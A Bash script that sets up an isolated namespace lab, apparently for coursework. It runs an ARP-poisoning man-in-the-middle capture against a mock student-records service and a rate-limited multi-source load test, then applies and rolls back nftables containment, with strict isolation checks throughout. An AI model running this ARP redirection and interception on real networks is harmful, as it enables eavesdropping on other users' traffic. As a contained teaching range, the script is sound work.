#!/usr/bin/env bash
# ONLY inside a disposable Linux VM. All traffic is confined to newly created
# namespaces on a new bridge with no attached physical port or default route.
set -Eeuo pipefail
umask 077

HERE="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
SCENARIO="all"
VICTIM="alpha"
while [ "$#" -gt 0 ]; do
  case "$1" in
    --scenario)
      SCENARIO="${2:?missing scenario}"
      shift 2 ;;
    --victim)
      VICTIM="${2:?missing victim}"
      shift 2 ;;
    *) echo "Unknown argument: $1" >&2; exit 2 ;;
  esac
done
case "$SCENARIO" in mitm|multi-origin|all) ;; *) exit 2 ;; esac
case "$VICTIM" in alpha|beta) ;; *) exit 2 ;; esac

if [ "${EUID}" -ne 0 ]; then
  echo "Run inside a disposable Ubuntu VM with sudo; never on shared college host OS." >&2
  exit 2
fi
for cmd in ip python3 curl tcpdump timeout nft sysctl sha256sum grep mktemp ping; do
  command -v "$cmd" >/dev/null || { echo "Missing command: $cmd" >&2; exit 2; }
done
# Must be explicitly acknowledged after institutional authorization. This
# confirmation does not create permission to attack the campus network.
if [ "${MON_DISPOSABLE_VM_CONFIRMED:-}" != "YES" ]; then
  echo "Set MON_DISPOSABLE_VM_CONFIRMED=YES only in a disposable VM with no bridged campus NIC." >&2
  exit 2
fi

TAG="$(printf '%04x' "$(( BASHPID % 65535 ))")"
BRIDGE="mbr${TAG}"
BASE="monrange${TAG}"
CLIENT="${BASE}c"
SRC2="${BASE}s"
SRC3="${BASE}t"
RELAY="${BASE}r"
V1="${BASE}a"
V2="${BASE}b"
NAMES=("$CLIENT" "$SRC2" "$SRC3" "$RELAY" "$V1" "$V2")
VICTIM_NS="$V1"
VICTIM_IP="10.253.42.20"
if [ "$VICTIM" = "beta" ]; then
  VICTIM_NS="$V2"
  VICTIM_IP="10.253.42.21"
fi
OUT="$(mktemp -d /tmp/mon-isolated-range.XXXXXXXX)"
SERVER_PID=""
TCPDUMP_PID=""
ARP_CAPTURE_PID=""
cleanup() {
  set +e
  [ -z "$TCPDUMP_PID" ] || kill "$TCPDUMP_PID" 2>/dev/null
  [ -z "$ARP_CAPTURE_PID" ] || kill "$ARP_CAPTURE_PID" 2>/dev/null
  [ -z "$SERVER_PID" ] || kill "$SERVER_PID" 2>/dev/null
  for ns in "${NAMES[@]}"; do
    ip netns del "$ns" 2>/dev/null
  done
  ip link del "$BRIDGE" 2>/dev/null
}
trap cleanup EXIT INT TERM

# No existing network, interface or campus switch is modified.
ip link add name "$BRIDGE" type bridge
ip link set "$BRIDGE" up
attach() {
  local ns="$1" ipaddr="$2" index="$3"
  local hostif="m${TAG}${index}a"
  local peerif="m${TAG}${index}b"
  ip netns add "$ns"
  ip link add "$hostif" type veth peer name "$peerif"
  ip link set "$hostif" master "$BRIDGE"
  ip link set "$hostif" up
  ip link set "$peerif" netns "$ns"
  ip -n "$ns" link set "$peerif" name eth0
  ip -n "$ns" link set lo up
  ip -n "$ns" address add "${ipaddr}/24" dev eth0
  ip -n "$ns" link set eth0 up
  [ -z "$(ip -n "$ns" -4 route show default)" ] || {
    echo "UNSAFE: default route in test namespace" >&2; exit 1;
  }
  if ip -n "$ns" -4 route get 8.8.8.8 >/dev/null 2>&1; then
    echo "UNSAFE: external route exists in test namespace" >&2; exit 1
  fi
}
attach "$CLIENT" 10.253.42.10 1
attach "$SRC2" 10.253.42.11 2
attach "$SRC3" 10.253.42.12 3
attach "$RELAY" 10.253.42.30 4
attach "$V1" 10.253.42.20 5
attach "$V2" 10.253.42.21 6

ip netns exec "$VICTIM_NS" python3 "$HERE/http_service.py" >"$OUT/victim.jsonl" 2>&1 &
SERVER_PID="$!"
ready=0
for i in $(seq 1 30); do
  if ip netns exec "$CLIENT" curl -fsS --max-time 1 \
    "http://${VICTIM_IP}:8081/health/live" >"$OUT/baseline-health.json"; then
    ready=1
    break
  fi
  sleep 0.1
done
[ "$ready" -eq 1 ] || { echo "Victim did not become ready" >&2; exit 1; }

printf 'Run: isolated veth namespaces only\nVictim selected: %s (%s)\nEvidence: %s\n' \
  "$VICTIM" "$VICTIM_IP" "$OUT"

if [ "$SCENARIO" = "mitm" ] || [ "$SCENARIO" = "all" ]; then
  echo "[MITM] Baseline authentic MAC binding, then isolated ARP redirection"
  # Capture original and forged ARP replies from the freshly created bridge.
  timeout 7 tcpdump -U -nn -s 96 -i "$BRIDGE" -c 25 \
    -w "$OUT/arp-packets.pcap" arp >"$OUT/arp-capture.log" 2>&1 &
  ARP_CAPTURE_PID="$!"
  sleep 0.4
  # Establish real neighbor mappings before testing contradictory replies.
  ip netns exec "$CLIENT" ping -c 1 -W 1 "$VICTIM_IP" >/dev/null
  ip netns exec "$VICTIM_NS" ping -c 1 -W 1 10.253.42.10 >/dev/null
  CLIENT_MAC="$(ip netns exec "$CLIENT" cat /sys/class/net/eth0/address)"
  VICTIM_MAC="$(ip netns exec "$VICTIM_NS" cat /sys/class/net/eth0/address)"
  RELAY_MAC="$(ip netns exec "$RELAY" cat /sys/class/net/eth0/address)"
  printf '%s\n' "Initial victim MAC: $VICTIM_MAC" >"$OUT/arp-binding-before.txt"
  ip -n "$CLIENT" neigh show "$VICTIM_IP" dev eth0 >>"$OUT/arp-binding-before.txt"
  ip netns exec "$RELAY" sysctl -q -w net.ipv4.ip_forward=1
  # These forged ARP frames are fixed to the new veth bridge address range
  # and arp_lab.py independently refuses initial or routed namespaces.
  MON_RANGE_NAMESPACE=isolated-veth-only ip netns exec "$RELAY" \
    env MON_RANGE_NAMESPACE=isolated-veth-only \
    python3 "$HERE/arp_lab.py" "$VICTIM_IP" "$VICTIM_MAC" \
    10.253.42.10 "$CLIENT_MAC" >"$OUT/arp-attempt.json"
  ip -n "$CLIENT" neigh show "$VICTIM_IP" dev eth0 >"$OUT/arp-binding-during.txt"
  ip -n "$VICTIM_NS" neigh show 10.253.42.10 dev eth0 >>"$OUT/arp-binding-during.txt"
  wait "$ARP_CAPTURE_PID" || true
  ARP_CAPTURE_PID=""
  tcpdump -nn -e -tt -r "$OUT/arp-packets.pcap" \
    >"$OUT/arp-captured-frames.txt" 2>"$OUT/arp-read.log"
  python3 "$HERE/analyze_arp.py" --tcpdump-text "$OUT/arp-captured-frames.txt" \
    --out "$OUT/arp-mon-findings.json" >"$OUT/arp-analysis.log"
  if ! grep -qi "$RELAY_MAC" "$OUT/arp-binding-during.txt"; then
    echo "ARP redirection did not take effect: no MITM claim" >&2
    exit 1
  fi
  timeout 8 ip netns exec "$RELAY" tcpdump -U -nn -s 96 -i eth0 \
    -c 4 -w "$OUT/mitm-packets.pcap" \
    "tcp and host 10.253.42.10 and host $VICTIM_IP and port 8081" \
    >"$OUT/mitm-capture.log" 2>&1 &
  TCPDUMP_PID="$!"
  sleep 0.5
  ip netns exec "$CLIENT" curl -fsS --max-time 4 \
    "http://${VICTIM_IP}:8081/api/students?limit=1" \
    >"$OUT/mitm-victim-response.json"
  wait "$TCPDUMP_PID" || true
  TCPDUMP_PID=""
  if ! tcpdump -nn -r "$OUT/mitm-packets.pcap" -c 1 \
    >"$OUT/mitm-path-observed.txt" 2>/dev/null; then
    echo "No verified packets at relay: cannot claim successful MITM" >&2
    exit 1
  fi
  echo "MITM PATH OBSERVED: traffic traversed attacker namespace; evidence recorded"
  # Containment/rollback proof: replace both poison-induced neighbor mappings
  # with actually observed original MACs; then restore ordinary ARP dynamics.
  ip -n "$CLIENT" neigh replace "$VICTIM_IP" lladdr "$VICTIM_MAC" nud permanent dev eth0
  ip -n "$VICTIM_NS" neigh replace 10.253.42.10 lladdr "$CLIENT_MAC" nud permanent dev eth0
  ip netns exec "$RELAY" sysctl -q -w net.ipv4.ip_forward=0
  ip -n "$CLIENT" neigh show "$VICTIM_IP" dev eth0 >"$OUT/arp-binding-recovered.txt"
  grep -qi "$VICTIM_MAC" "$OUT/arp-binding-recovered.txt"
  ip netns exec "$CLIENT" curl -fsS --max-time 4 \
    "http://${VICTIM_IP}:8081/health/live" >"$OUT/mitm-recovered.json"
  ip -n "$CLIENT" neigh del "$VICTIM_IP" dev eth0
  ip -n "$VICTIM_NS" neigh del 10.253.42.10 dev eth0
  echo "MITM recovery verified at test neighbor cache and HTTP service"
fi

if [ "$SCENARIO" = "multi-origin" ] || [ "$SCENARIO" = "all" ]; then
  echo "[MULTI-ORIGIN] Three real independent namespaces, capped at 5 rps each"
  LOAD_PIDS=()
  for item in "$SRC2" "$SRC3" "$RELAY"; do
    ip netns exec "$item" python3 "$HERE/load.py" \
      --target "$VICTIM_IP" --duration 6 --rps 5 \
      >"$OUT/load-${item}.json" &
    LOAD_PIDS+=("$!")
  done
  for pid in "${LOAD_PIDS[@]}"; do
    wait "$pid"
  done
  python3 "$HERE/analyze_http.py" \
    --log "$OUT/victim.jsonl" --target "$VICTIM_IP" \
    --out "$OUT/multi-source-mon-findings.json" \
    >"$OUT/multi-source-analysis.log"
  # Quantification comes from real server and source logs, not synthetic
  # graphics, a fabricated pps value, or a claimed upstream DDoS.
  ip netns exec "$CLIENT" curl -fsS --max-time 4 \
    "http://${VICTIM_IP}:8081/health/live" >"$OUT/after-load-health.json"
  echo "[CONTAIN] Scoped nftables rules ONLY inside disposable victim namespace"
  ip netns exec "$VICTIM_NS" nft -f - <<'NFT'
table inet mon_range {
  chain input {
    type filter hook input priority 0; policy accept;
    ip saddr { 10.253.42.11, 10.253.42.12, 10.253.42.30 } tcp dport 8081 drop
  }
}
NFT
  ip netns exec "$VICTIM_NS" nft -a list table inet mon_range \
    >"$OUT/containment-rules.txt"
  if ip netns exec "$SRC2" curl --max-time 2 -fsS \
    "http://${VICTIM_IP}:8081/health/live" >/dev/null 2>&1; then
    echo "Containment verification failed: source still reached victim" >&2
    exit 1
  fi
  ip netns exec "$CLIENT" curl -fsS --max-time 4 \
    "http://${VICTIM_IP}:8081/health/live" \
    >"$OUT/authorized-client-during-containment.json"
  echo "[ROLLBACK] Remove ONLY this disposable nftables table"
  ip netns exec "$VICTIM_NS" nft delete table inet mon_range
  ip netns exec "$SRC2" curl -fsS --max-time 4 \
    "http://${VICTIM_IP}:8081/health/live" >"$OUT/rollback-verified.json"
  echo "Containment and rollback verified; this is bounded source pressure, NOT ISP-scale DDoS"
fi

(
  cd "$OUT"
  sha256sum ./*.json ./*.txt ./*.pcap 2>/dev/null >SHA256SUMS || true
)
echo "COMPLETE: saved actual observations, PCAP headers, host counts, and rollback proof"
echo "Evidence directory: $OUT"
